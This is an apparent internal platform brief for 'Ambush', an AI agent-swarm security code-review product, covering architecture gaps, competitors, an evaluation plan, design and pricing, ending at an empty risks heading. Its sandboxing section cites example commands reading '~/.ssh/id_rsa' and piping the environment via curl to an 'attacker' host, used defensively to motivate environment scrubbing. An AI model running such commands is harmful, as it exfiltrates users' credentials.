# Ambush — Platform Brief (Capstone)

*Supersedes the prior research & design brief. Integrates the competitive dossier (03), the engineering feasibility/build-plan (04), the direction-locked design pack (05), the docs-accuracy & security-hardening plan (02), and the brand verdict (06). Prepared 2026-06-28.*

## 1. Executive summary

Ambush should land on **governed, validated swarm security code-review, narrowed to the NDA/burst slice** — M&A technical due-diligence, dependency vetting, pre-release diff review — because it is the arena with low live-fire liability, a daily feedback loop, real budgeted pain, and a client deliverable that gives a signed attestation a home. We **sell the painkiller (validated signal-to-noise that filters AI slop) and build the moat (a governed, cryptographically attested audit chain) underneath.** These are **complementary, not one engine**: per-tool-call ALLOW/DENY receipt signing is produced regardless of whether findings are validated, and the finding-validator does not itself produce receipts — but both are gated by the same evidence layer, so building one strengthens the other. The entire company is contingent on one unproven capability we must test in **weeks, not quarters**: that filtered, consensus-gated fan-out of *heterogeneous* agents beats one strong agent plus one static analyzer on precision without collapsing recall — so the **offline GO/KILL eval runs before a single product ticket**, and if it fails we have spent three weeks rather than a year. The honest engineering starting line is humbling: the marketed security pillar (**Chio**) is a 158-line shim around a binary that exists nowhere and **fails open**, while the real, tested Ed25519 crypto lives in the **Rust engine** — so the first technical move is to extract that engine trust-kernel (`swarm-spine/-crypto/-policy`) as a local daemon and delete the vapor. The finding-validator itself is **net-new code**, not an engine crate. The "100 lanes" headline is really **~30-50 lanes** on real hardware, gated by RAM and rate limits, with a **cost doom-loop of ~$4,300-7,200/hr** if the cache TTL expires under throttle. **"Local" means your infra, keys, and audit under a DPA — not air-gap:** the moment a lane calls Claude or GPT, the code egresses to a model provider, so we say so plainly and reserve true air-gap (with weaker local models) for a named NDA/IR niche. We go to market on the **Burp Suite playbook** — MIT OSS core → ~$400/seat Pro → ~$15-40k Org/Audit tier — and we **immediately kill the "ClawdStrike" engine codename**, which is a live legal blocker, not a footnote. Offense/CTF is the proving ground and funnel, never first revenue; IR/DFIR is the later expansion where the engine's detection half finally becomes load-bearing.

## 2. Reality check — what is actually built

Ambush is **two asymmetric halves, and the marketing inverts the engineering truth.** This single fact reorganizes the whole strategy.

**Control plane (TypeScript/Electron, MIT, "Backbay Labs") — a polished but shallow prototype.** The swarm loop is genuinely real and runnable: `deploySwarm` (`swarm-orchestrator.ts:127-147`) fans out lanes, each a real `git worktree add -b` (`worktree-manager.ts:32-69`) with a real node-pty terminal and a per-lane findings file. The IPC/bus/manager architecture is clean — `docs/ARCHITECTURE.md` is graded **excellent** and is more faithful to the code than the engine's own README. But the two marquee pillars are vapor:

- **Chio** (`chio-governor.ts`) is a 158-line shim around a `chio` binary that **exists nowhere in the repo**. When it is absent — i.e. always — `wrapMcp` returns the raw command and "agents run ungoverned" (`:84`): it **fails OPEN**, the exact opposite of the stated fail-closed philosophy. It governs only the OpenKnowledge intel-MCP path (not shell, exec, or network — the dangerous surface), its `DEFAULT_POLICY` actually allows `write/edit/move/checkpoint/skills/exec` and denies only `delete` (so the "read-only" claim in the docs is false), it matches tool *names* not arguments, and the app trusts `chio receipt list` with **no client-side signature verification**.
- **OpenKnowledge** is `npx @inkeep/open-knowledge` with `running=true` fabricated on a hardcoded port before health is verified. "Consolidate kill-chain RUNBOOK" is **string concatenation, not synthesis**.
- There is **no validation/consensus layer of any kind**, **no concurrency throttle** behind the lane count, worktree teardown (`WorktreeManager.remove`) is implemented but **never called** (state leaks every deploy), persistence is a single `current.json`, and there are **zero control-plane tests**.

**Engine (Rust, 15 crates, ~158K LOC, Apache-2.0) — mixed but genuinely real.** `cargo build --all-targets` succeeds; Criterion benchmarks are honest (~8.4k events/sec, ~103µs p50). The hot path is tested end-to-end: telemetry → 11 Whisker detectors → signed pheromone state → deterministic fail-closed gate → response adapters → **Ed25519, per-issuer hash-chained receipts** (`swarm-spine`), with real signed artifacts on disk. **~940 tests pass — but that is the green *subset*: `cargo test --workspace` is *not* green out of the box** (a missing `office-baseline-control.yaml` fixture breaks the full run; 214 of the passing tests are critical-lane). Two further honest caveats: (1) "live response" does **no native host actuation** — every isolate/kill is a JSON POST to an external EDR, so the engine is a decider+proxy; (2) the largest crate, **swarm-evolution (~23%, 31,783 LOC), is an orphan** — no dependents, no entrypoint. Critically, even in the engine the guard pipeline is mostly off the hot path: the runtime only constructs `GuardAction::ResponseAction` (`swarm-runtime/src/lib.rs:679`), the pipeline is `Option<GuardPipeline>` defaulting to `None`, and only `secret_leak` inspects live actions — the file/shell/egress guards are **built, tested, and never enforced on agents.**

**Convergence is 0% built.** The control plane has no reference to the engine; `docs/ENGINE-INTEGRATION.md` is explicitly "no code wired yet" — and itself contains two HIGH errors that would make an implementer build against engine behavior that doesn't exist.

**The single load-bearing fact:** the strongest, tested crypto-trust stack lives in the **engine** (`swarm-spine`/`-crypto`/`-policy`), while the half *marketed* as non-repudiation (Chio) has no crypto in-repo. Note that `swarm-consensus` is **BFT committee voting — it is *not* finding corroboration** and is not the slop-filter's spine (see §7). A sophisticated buyer debunks "non-repudiation for what the swarm touches" in minutes today. Closing that inversion is build #1.

**The public docs are themselves a credibility landmine.** The repo's own `PRODUCT` and `GOVERNANCE-SECURITY` docs are graded **"misleading" and ship-blocking** (02 §1): they assert fail-closed governance and non-repudiation that the code does not deliver. Any buyer reading the repo during diligence sees those false claims directly — so these artifacts must be corrected *before* any diligence, not just the underlying code.

**The brand blocker (belongs here, not in a footnote).** The Rust engine's public codename **"ClawdStrike"** is a **KILL-now blocker.** It is a phonetic/visual parody of CrowdStrike (~$174B, federally registered famous mark) used for a *directly competing* EDR/detection category — single-consonant swap, identical "-Strike" suffix, *closer* to CrowdStrike than "AiStrike," whom CrowdStrike is **actively suing** (N.D. Cal. 5:2026-cv-01984, filed 2026-03-06); CrowdStrike also DMCA'd the non-commercial "ClownStrike" parody in 2024. There is no parody/fair-use defense for a competing commercial source identifier. Worse, it is **already public** as `backbay-labs/clawdstrike` (GitHub + `clawdstrike.ai` + a published crate), which raises exposure and creates a willful-infringement paper trail. Rename it before it appears in any further deck, repo, or pitch.

## 3. Market & competitive landscape

The map clusters into six, and the white space is consistent across all of them: **governed + validated + signed, delivered locally — the intersection nobody fuses.**

- **AI-SOC / IR triage** — hottest and most crowded: Dropzone ($37M B), Prophet ($30M A), Exaforce ($75M A), **7AI ($130M A, largest cyber Series A ever)**, Torq ($140M D / $1.2B), plus Conifers/Simbian/Radiant/Intezer. All are **cloud SaaS overlays on the customer's SIEM** that triage to a verdict and stop before destructive action. White space: trusted autonomous *response*.
- **Autonomous offense** — booming, weak governance: **XBOW (~$237M, $1B+, #1 HackerOne)**, Horizon3/NodeZero ($100M D, FedRAMP), RunSybil ($40M), Terra ($30M A), Pentera. The swarm pattern itself is commoditized in OSS (Pentest-Swarm-AI, CAI, HexStrike). White space: provable scope/RoE compliance + chain-of-custody.
- **Agent-orchestration / dev-tools** — Ambush's *mechanic*, fully commoditized: **Orca (the literal MIT upstream parent, 7.6k stars), Conductor ($22M), Sculptor (container isolation — explicitly safer than worktrees), Cursor 2.0, and Claude Code's own Agent Teams.** The model vendor commoditizes fan-out from below, for free.
- **AppSec AI** — the whole battle is signal-to-noise: Semgrep Assistant, Snyk, Copilot Autofix (incumbents); ZeroPath, Corgea, DryRun, Pixee, **Endor (selling "95-97% noise reduction" *as the product*)**. White space: signed proof-of-review/coverage attestation.
- **EDR / live-response & eBPF** — CrowdStrike Charlotte (FedRAMP High), SentinelOne Purple AI, Microsoft Security Copilot (bundled in E5); **Tetragon** (in-kernel SIGKILL) and Falco (detect-only). Note Tetragon is a *contrast* case, not the engine's analog: the engine does **no native host actuation** (§2) — it decides and proxies to an external EDR, exactly what Tetragon's in-kernel enforcement is not.
- **Governance/provenance** — Chio's neighborhood, commoditizing fast: AWS Bedrock AgentCore (Cedar, default-deny, **no signing**), OPA/Rego, Invariant (acquired by Snyk), Runlayer/Operant/Helmet, an **IETF draft (draft-marques-asqav-compliance-receipts)**, and a **patent-pending twin (Attested Intelligence)** shipping near-identical Ed25519 hash-chained receipts-per-tool-call.

**The three most dangerous competitors:**

1. **7AI — the narrative assassin.** Ex-Cybereason founders, ~$130M, explicitly markets **"swarming AI agents"** with **"chain of custody"** and a **"complete audit trail"** — a near-verbatim collision with Ambush's exact wedge. *How Ambush wins:* puncture the trust claim — 7AI's "chain of custody" is application-level logging, **not cryptography**; Ambush's per-tool-call Ed25519 signed receipts are *actual* mathematical tamper-evidence. Do not fight 7AI on defensive alert-triage where it is better-funded; take the offense/IR/CTF/code-review breadth it structurally ignores and own "real CLI agents you watch in live terminals" vs its closed SaaS swarm.
2. **XBOW — the bar-setter and the existential warning.** The whole offensive market competes on one thing: a **deterministic, non-LLM validator** that confirms exploits and kills false positives. *The caveat that should keep the founder up at night:* **a 100-agent swarm without a validator IS the false-positive noise XBOW already solved.** Ship fan-out without the validator and Ambush loses instantly. Avoid head-to-head web-exploit depth; compete where XBOW is absent.
3. **The commoditization pincer — Orca (upstream, can absorb any UI improvement instantly) + Claude Code native subagents/worktrees/agent-teams + OpenHands/Factory** (Factory already markets IR with a ~95.8% on-call-resolution claim). **Stop treating fan-out as the moat — it is inherited table stakes.** OpenHands and Factory are the most likely to bolt a security layer on first; the clock is real.

**The white space, stated precisely.** The receipt primitive itself is **commoditizing, not unclaimed** — there is already an IETF draft (draft-marques-asqav-compliance-receipts), Cedar/default-deny policy in Bedrock AgentCore, and a **patent-pending twin (Attested Intelligence) shipping a near-identical Ed25519 hash-chained per-tool-call receipt.** The market has *already taught buyers to ask for the property* — 7AI markets "chain of custody," Conifers sells "glass box," Devin exports to SIEM, Microsoft ships Entra Agent ID, every SOAR has "immutable audit trails" — but those are **tamper-evident-by-trust** (write-once logs in the vendor's own DB), not **tamper-evident-by-math.** So the durable position is **not** "we alone have the cryptographic primitive" (we don't, and it is standardizing) — **it is the intersection: governed + heterogeneous BYO-agent fan-out + durable linked intel + a unified, locally-verifiable signed audit, fused in one local-first surface.** Every individual axis is commoditized, commoditizing, or contested; only the *fusion* is unoccupied. **Honest caveat:** signed receipts prove **provenance, not truth** — they are worthless without the validator that makes the signed findings *true* rather than merely *provenanced*, which is precisely why the §5 eval gates everything.

## 4. Strategic recommendation — the wedge & the north star

**Wedge: governed, validated swarm security code-review, narrowed to the NDA/burst slice.** A security engineer or boutique consultant has a burst of code they don't trust (an M&A target's repo under NDA, a new dependency, a pre-release diff, a vibe-coded service) and needs a thorough parallelized review they can defend to a client or CISO — **without drowning in AI slop, and with a portable signed record of exactly what was reviewed and what each agent was allowed to do.**

**Buyer:** the practitioner and their manager — a staff/principal AppSec engineer, a boutique pentest/AppSec principal, or an M&A technical-DD lead — bought on a team card, Burp-style. **Not** the enterprise SOC (an unwinnable FedRAMP cloud bake-off for a v0 desktop app).

**Reconciling the six tensions explicitly:**

1. **Painkiller vs vitamin — sell one, build the other; they are complementary.** Nobody pays a premium for "non-repudiation" by name, so we **lead the sale with the slop-filter (the painkiller).** Per-tool-call cryptographic attestation is genuinely durable as part of the intersection moat (§3), so we **build the signed attestation underneath.** These are *complementary, not the same engine*: governance receipts sign every ALLOW/DENY regardless of finding quality, while the validator scores findings — but **both are gated by the same evidence layer**, so the consensus + evidence-gate that turns fan-out into a filter is also what makes a signed finding worth signing. Lead with the painkiller; let chain-of-custody compound underneath; instrument who brings up the attestation first in the Pro→Org conversation.
2. **The validator is existential, agreed from two sides.** The brief's §9.1 correlated-error risk and XBOW's entire moat point at the same thing. This is why §5 (the eval) runs *before* product work. The validator is **net-new clustering code** (§7), not an engine crate.
3. **"100 lanes" vs reality.** The honest number is **~30-50 lanes** on 32-64GB RAM, bounded by RAM (~300-700MB/lane) and `kern.tty.ptmx_max=511`, not CPU — and a cost doom-loop (§7). The headline is a liability; the message is "governed, *validated* fan-out," not "100 lanes, fast."
4. **"Local" vs model egress — and the wedge collision this creates.** The moment a lane calls Claude/GPT, the source code egresses to a model provider. So "local" means **"your infra, keys, and audit, with model inference egressing under a DPA"** — *not* air-gap. This directly collides with the wedge rationale, since the NDA/burst slice was chosen partly because review-in-place matters. **We resolve it head-on rather than papering over it:** the working thesis is that **real M&A/NDA processes do accept BYO-key frontier inference under a DPA** (the same way they already accept cloud data-rooms, e-discovery SaaS, and outside counsel on cloud email) — so the wedge rationale is *defensibility of the deliverable and review-in-your-perimeter*, **not** "no bytes ever leave." If design partners reject DPA cloud inference for NDA source, then **local-model benchmarking is promoted from afterthought to a gating requirement (§5, §7) and the air-gap path becomes load-bearing, not a niche.** We commit to learning which is true with the first 5-10 partners; we never claim "nothing leaves the box" about an engagement that calls a frontier model.
5. **Chio is vapor; the real crypto is in the engine.** Extract `swarm-spine/-crypto/-policy` as a local trust-kernel daemon for **governance and attestation** and **delete the absent `chio`.** This fixes the credibility gap (marketing stops inverting engineering). The slop-filter's validator is built fresh alongside it — *not* from `swarm-consensus`.
6. **The brand blocker is real and public.** Kill "ClawdStrike" now (see §10).

**North star:** a local-first, fail-closed, **governed-and-validated agent-swarm operator surface** with a portable signed audit chain that one day spans both human-driven swarm action and autonomous engine detection+response — the converged "engine = sensor/actuator, intel vault = memory, trust-kernel = governance/attestation, swarm = human operator" category-of-one. The moat is the **intersection** (governed + heterogeneous BYO-agent fan-out + durable linked intel + a unified signed audit, delivered local), **not any single axis** — every individual axis is commoditized, commoditizing, or contested.

**Alternatives rejected.** *Lead with offense/continuous-pentest:* superior proving ground (a live web PoC is a true oracle) but a trap as the business — the segment where validation works (web/bounty) and the segment that pays for governance (consultancies on internal/AD/logic engagements with no oracle) are **nearly disjoint**, the arena is the best-funded bloodbath in security, and one out-of-scope action evaporates the trust story. *Lead with IR/DFIR:* the strongest long-term differentiator and the only wedge where the mature engine is load-bearing, but the **most liability-allergic buyer and slowest learning loop** — you wait for a breach, then run on retro cases with no urgency; an audited hallucination in a forensic timeline is Daubert/malpractice exposure. Expansion, not first wedge. *Lead with the governance kernel as stated:* right architecture, wrong sales lead — nobody pays a premium for non-repudiation, so leading with the vitamin stalls as free. We take its architecture but **lead with the painkiller.** Land where you can learn, expand where you can win.

## 5. The make-or-break experiment — the validation GO/KILL eval

**One claim underwrites the whole company:** that filtered, consensus-gated fan-out of *heterogeneous* agents produces more trustworthy findings than one strong agent plus one static analyzer. Before a single product ticket, a **3-week offline eval (1 pilot week + 2 full)**, run by 1-2 AppSec engineers in a `eval/` sibling that does not touch product code, answers GO/KILL. Its output is one `scorecard.csv` plus an adjudicated, labeled corpus that *becomes* the product's `Consolidate` spec.

**It first defines the schema the product lacks.** Today lanes write freeform `findings/<id>.md` and `consolidate()` concatenates them. The eval's first deliverable is the per-lane `findings/<id>.jsonl` carrying `cwe`, `location`, typed machine-checkable `evidence[]` (poc / taint_path / test / sast_corro / citation), a **family-tagged** `model`, and `lane_confidence`. The load-bearing **consensus key** is `K = (normalized_file_path, CWE_class, sink_or_symbol)` with ±10-line overlap — the definition of "two lanes corroborate." This corroboration logic is **net-new clustering code**; the engine's `swarm-consensus` (BFT committee voting) solves a different problem and is explicitly **not** reused here.

**Seven arms, two hypotheses, on one paired task set:**
- **H1 (signal):** the full pipeline (A4 = N-lane union → consensus support ≥ k → evidence/oracle gate) must beat both **A0 (one strong agent)** and **A1 (strong agent + Semgrep)** on finding-level precision without shedding fan-out's recall.
- **H2 (independence):** cross-family panels must add real signal over same-family panels — because the #1 existential risk is that BYO agents are the **same few frontier models**, so 3 lanes "agreeing" can be one model hallucinating 3 times and consensus *promoting* the slop.

H2 is measured directly: for each task, run a **HOMO-6** panel (six lanes of one family, varied only by seed/persona) and a **HETERO-6** panel (≥3 families: Claude, GPT, Gemini, + one OSS like Qwen-Coder). Compute pairwise error-vector correlation, derive **effective independent voters** `N_eff = N / (1 + (N−1)ρ̄)`, and measure the **correlated-FP promotion rate** — the fraction of *false* clusters that nonetheless reach support ≥ k. Literature suggests family-correlated panels can collapse to ~2.5-3.6 effective votes, so this is not paranoia.

**If the wedge demands air-gap (§4-#4), a local-model arm is gating, not optional.** When partner discovery indicates NDA source cannot egress under DPA, the eval **must** add a strong-local-model panel (e.g. a quantized Qwen-Coder/Llama tier) and report its precision/recall band against the frontier arms; air-gap viability then becomes a GREENLIGHT condition rather than a side note.

**Corpora span four tiers; Tier D (negative controls) is non-negotiable** — without code whose correct answer is "no finding," you can only measure recall, never precision or the slop-filter. Tier A: execution-oracle real CVEs (CyberGym ~80, CVE-Bench ~20). Tier B: commit-level labels (PrimeVul, with built-in safe-function negatives). Tier C: planted whole apps (Juice Shop, NodeGoat, OWASP Benchmark with deliberate TP *and* FP cases). Tier D: PrimeVul-safe halves + OWASP-Benchmark FPs + a frozen hardened library. Because public benchmarks leak into training data, a **private 20-30 finding planted set** (hand-injected CWE-89/79/22/78/502 into recent clean OSS, with matched clean originals) is the leak-proof tie-breaker; report public-vs-private precision deltas. Decisions ride on bootstrap CIs and paired McNemar tests, two-annotator blind adjudication (target κ ≥ 0.7).

**GREENLIGHT — all four must hold:**
1. **Signal:** `P_A4 − max(P_A0, P_A1) ≥ +0.15` absolute, non-overlapping CIs, McNemar p < 0.05.
2. **Recall retention:** `R_A4 ≥ 0.90 × R_union`.
3. **Independence pays:** HETERO `N_eff ≥ 1.5 × HOMO N_eff`, and HETERO precision-at-iso-recall beats HOMO.
4. **Slop contained & cheap:** correlated-FP promotion (HETERO, A4) < 0.10, and cost-per-validated-finding ≤ 3× A1.

**KILL/PIVOT (any one):** A4 precision CI overlaps A1 at iso-recall (the cheaper baseline wins); HETERO ≈ HOMO (independence is fictional); HOMO consensus promotes correlated FPs such that `P_A4 < P_A0` (consensus is *actively harmful*); or recall retention < 0.75. A **YELLOW** — signal real but only with forced family diversity — still ships, but reshapes the roadmap so diversity enforcement becomes the entire pitch and sandboxing/attestation demote to secondary.

**Budget:** ~250 tasks × 6 lanes × ~$0.30-1.50 ≈ **$1.5-4k**, cached aggressively so arms A2-A6 are pure post-processing. One full run also emits the end-to-end attestation (in-toto statements, Merkle root via the engine's real `swarm-crypto`, a prototype `ambush verify`) so the demo's verifier is proven real — a side-quest, not part of GO/KILL.

**If the eval kills H1 or H2, stop at Week 3 — the cheapest possible failure, before a line of UX is built on a false premise.**

## 6. Product design

The product is the **governance + validation + intel layer wrapped around commoditized fan-out** — fan-out is the on-ramp, not the pitch. The eval *defines* the objects (clusters, diversity, quarantine, signed receipts); the UX *renders* exactly those objects; the GTM *monetizes* the boundary between producing trust (paid) and verifying it (free).

**Operator surface — a three-pane war room.** Today the app is tab-routed, showing one of `SwarmView | IntelPane | ReceiptsPane`. The core IA move collapses the three into one persistent war room visible *simultaneously*, under an always-on scope/authorization banner with a kill-switch:

- **Left — OperationTree:** Vectors grouped by role/lease, each row a status dot, codename, a **lease chip**, ALLOW/DENY tallies, and a findings count `⚑N`. The lease chip is the *visible* promise that worktrees are not the boundary: `ro` (read-only worktree), `rw▣` (sandboxed write in container/microVM), `net⊘` (egress denied), `net⊕scope` (scoped allowlist). When an operator points 24 BYO Vectors at untrusted code, `rw▣ net⊘` is the posture they can *see*.
- **Center — CenterStage:** a segmented mode switch — Lane (the reused `TerminalPane` + a per-lane `IntelGraph` rail) / Findings / Runbook.
- **Right — AuditStream:** the polled `ReceiptsPane` table refactored into a live, newest-on-top signed-receipt feed (new streaming `evt:receipt`) with a whole-chain verify badge in the footer.

**Four signature demo moments, each mapping one-to-one onto an eval object:**
1. **Real-time DENY.** An out-of-scope `curl` triggers `evt:receipt` with `verdict==='DENY'`; the row goes sticky-red and a `DenyToast` fires: `⛔ DENIED in real time · net.connect → pastebin.com:443 · policy: scope.egress · receipt #312`. (The toast is scoped strictly to the *denied egress channel* — it asserts that *this connection* was blocked, never that the whole engagement stayed local; frontier model calls still egress under DPA.) This needs the highest-leverage net-new work — the streaming event plus `ReceiptSummary.args/reason` fields, because today receipts carry no arguments and an argument-level deny *cannot even be rendered.*
2. **Slop quarantine** inside `FindingsReview` — the painkiller made visible. Two columns, **Corroborated** vs **Quarantine**, with a **model-diversity meter** (`●●○`) that reads *distinct frontier models*, not lane count — so "3 lanes / 1 model" still shows `●○○` and stays quarantined. A cluster lands in Quarantine iff `distinctModels < 2` OR no lane carries reproducible evidence. Each `FindingCard` shows severity, `file:line`, CWE, corroboration (`lanes N / models M`), and a checkable evidence row (`PTY` deep-link, `PoC`, `receipt#`).
3. **Lease posture made visible.** The OperationTree lease chips (`ro`, `rw▣`, `net⊘`, `net⊕scope`) render the live sandbox/egress boundary per Vector — the operator *sees* that 24 BYO agents on untrusted code are running `rw▣ net⊘`, not on the host.
4. **Export Attestation + Verify.** A two-step dialog bundles confirmed findings ∪ evidence receipts ∪ the full hash-chained log ∪ in-toto statement ∪ policy-pack hashes, Ed25519-signed by the local operator key; the reused `VerifyBadge` re-derives the Merkle root on a clean machine.

**Features mapped onto what exists:** Operations (`current.json`) → per-engagement model with scope manifest, per-engagement key, resumable event-log persistence. Vectors/worktrees/PTY → concurrency throttle + real worktree GC + escalation to container/microVM for any write phase. Intel vault → verify health before claiming `running`, ship AppSec page templates, keep the wiki-link graph (durable linked memory is genuinely differentiated). Chio → reborn as a thin HTTP client over the engine's `swarm-policy` + `swarm-spine` daemon, fail-**closed**, governing **shell + exec + network + filesystem with argument-level policy.** Consolidate (string concat) → real synthesis. Validation/consensus (none today) → first-class evidence-gating via **net-new clustering code**: a finding needs a reproducible artifact or it is labeled `unvalidated/needs-human`.

**The convergence (swarm ↔ engine)** is rendered as: engine detections auto-seed governed read-only Vectors, and **engine receipts merge into the same AuditStream as swarm receipts** — the first integration that makes the converged story *real instead of narrated*. Its Stage-1 unblock is the 6-line engine patch (§7), **contingent on the engine repo being in-scope to patch** — if the engine is frozen, Stage-1 must skip straight to the serve+SSE path. That is the later IR payoff; the durable layer is **governance + validation + intel**, not fan-out.

## 7. Technical architecture & build decisions

**Cost envelope and the doom-loop.** 100 lanes × 1hr, Claude Code, cache-warm: ~$500-1,150 (Sonnet), ~$800-1,900 (Opus), ~$350-450 (Haiku). The number to fear is the pathological column: **~$4,300-7,200/hr if turns drift >5min apart and the ephemeral cache TTL expires**, re-billing 120K context at full input price — and that blowup is *triggered by the throttling that high fan-out causes.* **Where it breaks first is rate limits, not dollars:** all lanes share one credential (`...process.env`); ~100 lanes emit ~200K output-tokens/min, exceeding standard OTPM caps → 429 → backoff → stall → cache loss → cost blowup. On a Pro/Max seat, 100 headless agents exhaust a 5-hour window in minutes and are ToS-shaped use of one subscription.

**The ~30-50 lane reality.** `deploySwarm` fires `void this.launchVector(vector)` in a tight loop (`:142`) — no await, no semaphore. 100 lanes = ~600-900 steady processes + ~300 transient `git` spawns + 100 `npx @latest` cold-resolves in one event-loop tick. Binding constraint is RAM (~300-700MB/lane → **~30-50 lanes on 32GB**) and `ptmx_max=511`. Fix: a bounded staged-ramp launcher (`Semaphore(min(cpus,8))` + ~150ms ramp) replacing the `void` loop; PTY-quiescence readiness replacing the fixed 1200ms/400ms timers; wire `worktree.remove` + a startup `git worktree prune` reaper. Also fix the per-call clamp bug (count clamped per call at `:130` but vectors *append* at `:131`, so repeated `deploySwarm(100)` accumulates >100).

**EnvScrub + sandbox — the cheapest top safety win.** Every agent today gets `env: { ...process.env }` (`:194`) including the raw shell profile — a shell lane can `cat ~/.ssh/id_rsa` or `env | curl attacker`. **EnvScrub (~1 day, zero deps)** replaces this with a curated allowlist (`PATH`, `TERM`, `LANG`, a per-vector scratch `HOME` so `~/.ssh` literally doesn't exist, `AMBUSH_*`, and only the one provisioned API key) — closing the worst exfil channel, which needs no filesystem access. Then: global semaphore + wall-clock deadline + **process-group kill** (today `proc.kill()` doesn't reap subtrees), and an OS sandbox wrapper (bubblewrap / macOS `sandbox-exec`, **fail-closed for the shell profile** — inverting today's fail-open). Worktrees are git isolation, not a security boundary (and fall back to a non-git scratch dir for 3 of 5 personas) — any write/exploit lane moves into a container/microVM with default-deny egress at the boundary.

**Extract the trust-kernel, delete Chio — and build the validator fresh.** `swarm-spine/-crypto/-policy` become a bundled **local trust-kernel daemon for governance and attestation** (the engine already serves `/healthz`, `/metrics`, SSE `/v1/events/stream`, `/v1/operator/*` via `swarmctl serve`). Fail-**closed**: no healthy policy engine → lanes do not launch. Adopt **Cedar/OPA + an in-toto/Sigstore-aligned receipt format**, not a hand-rolled YAML constant — standards alignment is free credibility against the commoditizing receipt primitive — and ship a standalone **`ambush verify` CLI** so a client checks the chain without trusting us. Reuse the engine's already-built `ForbiddenPathGuard`/`ShellCommandGuard`/`SecretLeakGuard`/`EgressAllowlistGuard` (exposed via `swarmctl guard eval --json`), which today are tested but never enforced on agents. **Do *not* reuse `swarm-consensus`** for finding corroboration — it is BFT committee voting, a different problem; the slop-filter's clustering on `K = (path, CWE, sink)` is **net-new code** (§5). **Quarantine or cut swarm-evolution (23%, 31K LOC)** and get `cargo test --workspace` green (it is not green today — missing `office-baseline-control.yaml` fixture) — stop letting "mature LOC" justify dead weight.

**The 6-line convergence patch — contingent on a patchable engine repo.** `swarm_detect.rs`'s `--json` block emits finding *counts only* (verified — `finding_count`/`deposit_count`, never the `findings` bodies that exist one line up at `bundle.replay.bundle.findings`). Serialize them via the existing `SwarmFindingEnvelope::from`, stamped `output_schema_version: 1`. **This assumes the engine repo is in-scope to modify; if it is frozen, Stage-1 convergence must skip the patch and jump straight to the serve+SSE path earlier than planned (04 §6).** Given a patchable repo, a thin Stage-1 `SwarmEngine` bridge (modeled 1:1 on `openknowledge-engine.ts`, ~1.5-2.5wk) shells out, balanced-brace-scans the JSON, normalizes (Severity SCREAMING_SNAKE → lowercase; `ThreatClass::Custom` flatten; `hostId` always null in CLI mode), and writes into the same vault `consolidate()` globs. Stage 2 (serve + SSE, real Ed25519 receipts to the UI) is the later bet; reserve `evt:engineSwarm:finding/receipt` channels now.

**Local-vs-cloud, honestly.** Local-desktop, single-tenant, first — CLOUD Act, EU residency, NDA source-review, and compromised-network IR all favor a tool inside the buyer's perimeter. Burp ($475/seat) is the GTM precedent for *practitioner-bought, locally-installed* security tooling — **but its defining trust property is that traffic never egresses, which is exactly the axis Ambush does *not* share** (code → Claude). We borrow Burp's *distribution and pricing* playbook, not its data-never-leaves claim. No multi-tenant cloud until a regulated buyer pays for a shared-audit-server tier. And the model-egress stance is stated per segment, never papered over: **DPA for code-review/offense; true air-gap (weaker local models) as a named niche for IR/NDA** — promoted to load-bearing if partner discovery (§4-#4) shows DPA cloud inference is rejected for NDA source. Benchmark a strong local model on the eval corpus; if it's within an acceptable band of frontier, air-gap is a real product — if not, sell "local infra under DPA" honestly.

## 9. Business model & GTM

**The Burp Suite playbook, numeric edition:** OSS-as-wedge → per-seat Pro → Governance/Audit tier. The line is drawn on one principle: **free = the swarm + the safety floor + the verifier (commodity, trust, funnel); Pro = making the swarm's output trustworthy and exportable (the painkiller); Org = making that trust shared, identity-bound, and retained.**

- **OSS Core (MIT, free forever):** fan-out, worktree isolation, PTY terminals, any-CLI-agent profiles, the intel vault, *basic* concatenation Consolidate, the fail-closed trust-kernel governance floor, and **`ambush verify`.** A security tool that paywalls the safety floor never gets pointed at untrusted code, and an attestation you must pay to check is worthless — so the verifier is free on both GTM and license grounds (mirrors `cosign verify`).
- **Pro (~$400/seat/yr):** the validated slop-filter (net-new cross-model-family corroboration, not the engine consensus crate), the container/microVM sandbox, synthesis-grade Consolidate, signed Attestation *export*, policy packs. $400 sits $75 under Burp Suite Pro's $475, inside the Semgrep ($35/contributor/mo) and Snyk ($25/dev/mo) bands. The clean boundary is the **sign/verify split:** you pay to *generate* a validated, signed artifact; anyone verifies it free. Position literally as *"Burp's go-to-market for the agent swarm"* — the practitioner-bought, locally-installed model, *not* a data-never-leaves claim.
- **Org/Audit (~$15-40k/yr):** shared audit server, SSO/SAML + RBAC, retention/legal-hold, a receipt SDK for CI/CD and deal-room embedding. *Below* a single traditional DD engagement ($25-50k) and below ~3-7 XBOW Pentest-on-Demand tests ($4-6k each), but recurring and unlimited bursts.

**Unit economics — the slop-filter is a scheduler, not a report-cleaner.** A heterogeneous review lane costs **~$6 blended.** The naive operator, distrusting any single lane, drags the slider to 100 → **~$600/burst** of correlated frontier-model noise. The governed path caps lanes per family, stops at corroboration saturation, kills quarantined slop lanes early → **~18 diverse lanes (~$108) + per-finding cross-family adjudication (~40 × $0.20 = $8) ≈ $116/burst, ~80% fewer lanes.** The architectural law: **cost is committed at *spawn*, so the filter must cap lanes up front and adjudicate findings, never re-run lanes** (per-lane re-validation re-adds $108 and destroys margin). For a boutique running 25 engagements × 2 bursts/yr: $30k → $5.8k token burn — **~$24k saved on a $400 seat, ~60× return**, Pro at ~95% gross margin (BYO keys, COGS ≈ $0). For the M&A-DD lead it replaces a $25-50k boutique engagement at a fraction of the cost while producing a board-grade signed artifact reviewed *inside the buyer's own perimeter and keys, under a DPA* — not air-gapped, and we never claim otherwise.

**The lane-cost margin problem** is the live risk: 100 lanes of slop is 100× the token bill at a $400 seat. The filter must reduce *lanes spent*, not just findings emitted — and a managed-validation/Org SKU where Ambush runs the adjudicator on its own keys must **adjudicate per finding (~$8/burst COGS), never per lane**, keeping COGS < ~15-20% of the SKU price.

**Channel:** founder-led design partners; a CTF leaderboard (cheapest viral proof of *governed* fan-out — the Anthropic/XBOW/CAI playbook); AppSec/red-team communities (r/netsec, the Burp/PortSwigger and OWASP following). **License posture stays clean:** MIT control plane (proprietary Pro modules permitted), Apache-2.0 engine (linkable, patent grant), GPL-3.0 OpenKnowledge invoked **subprocess-only, never vendored** — a hard line for v1.0 distribution. **The Pro→Org conversion event to instrument:** the first time a Pro user's attestation is independently `ambush verify`'d by an external counterparty (an acquirer's board, deal counsel, an auditor) who says "we want all of them this way."

## 11. Risks & how to de-risk

